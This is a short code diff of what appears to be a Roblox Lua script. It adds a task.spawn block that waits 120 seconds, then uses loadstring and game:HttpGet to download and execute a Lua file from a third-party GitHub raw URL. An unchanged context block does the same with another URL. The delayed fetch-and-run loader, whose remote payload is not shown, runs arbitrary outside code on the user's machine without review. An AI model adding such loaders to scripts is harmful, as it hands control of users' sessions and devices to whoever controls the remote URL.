@@ -157,6 +157,12 @@ task.spawn(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/hbjrev/nwhir.github.io/refs/heads/main/erj.lua"))()
 end)
 
+task.spawn(function()
+    task.wait(120) -- Wait for 120 seconds before executing
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ewewe514/lowserver.github.io/refs/heads/main/lowserver.lua"))()
+end)
+
+
 
 task.spawn(function()
     local player = game:GetService("Players").LocalPlayer
